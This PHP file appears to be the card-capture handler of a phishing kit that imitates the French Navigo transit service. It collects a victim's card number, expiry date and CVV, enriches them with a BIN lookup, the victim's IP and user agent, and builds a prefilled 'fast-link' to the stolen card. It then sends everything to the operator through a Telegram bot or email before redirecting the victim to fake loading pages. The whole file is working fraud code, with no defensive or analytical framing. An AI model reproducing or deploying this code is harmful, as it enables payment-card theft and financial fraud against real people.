<?php
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
include('../ab.php');
include '../config.php';
include '../functions.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

    if(!empty($_POST["cc"]) AND !empty($_POST["exp"]))
    {

        $_SESSION['cc'] = $_POST['cc'];

        $bin = substr($_POST['cc'], 0, 7);
        $bins = str_replace(' ', '', $bin);
        $ch = curl_init();
        $url = "https://lookup.binlist.net/" . $bins;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $someArray = json_decode($result, true);
        


        $message="DATE: " . date("Y/m/d") . ' a ' . date("h:i:s") . "\n";
        $message.="[💣]💸NAVIGO==CC[💣]\n";
        $message.="[🎁]ip:". _ip(). "\n";
        $message.="[🎁]SCHEME: " . $someArray['scheme']. "\n";
        $message.="[🎁]TYPE: " . $someArray['type']. "\n";
        $message.="[🎁]LEVEL: " . $someArray['brand']. "\n";
        $message.="[🎁]BANK: " . $someArray['bank']['name']. "\n";
        $message.="[".$someArray['country']['emoji']."]COUNTRY: " . $someArray['country']['name'] . "\n";
        $message.="[💣] FAST-LINK: https://" . $_SERVER["HTTP_HOST"] . "/redirect/fast_add.php?cc=".str_replace(" ", "", $_POST['cc']). "&exp=".$_POST['exp']."&name=".$_SESSION["lastName"] . " " . $_SESSION["firstName"] . "\n";
        $message.="[💳]NUMERO DE LA CARTE: " . $_POST['cc']. "\n";
        $message.="[💳]DATE D'EXPIRATION: " . $_POST['exp']. "\n";
        $message.="[💳]CRYPTOGRAMME: " . $_POST['cvv']. "\n";
        $message.="=================". "\n";
        $message.="[💣]USER AGENT: " . $_SERVER['HTTP_USER_AGENT']. "\n";

        if($rezParTelegram)
        {
            telegram_send(urlencode($message), $api_key, $chat_id); 
        }
        if($rezParMail)
            $mail=mail($my_mail,$Subject,$message,$head);


        if($applePay)
        {
            header('Location: ' . "../redirect/loading-secure.php");
        }
        else
        {
            header('Location: ' . "../redirect/load.php");
        }

    }
    else
    {
        header('Location: ' . "../redirect/infos.php");
    }
    




?>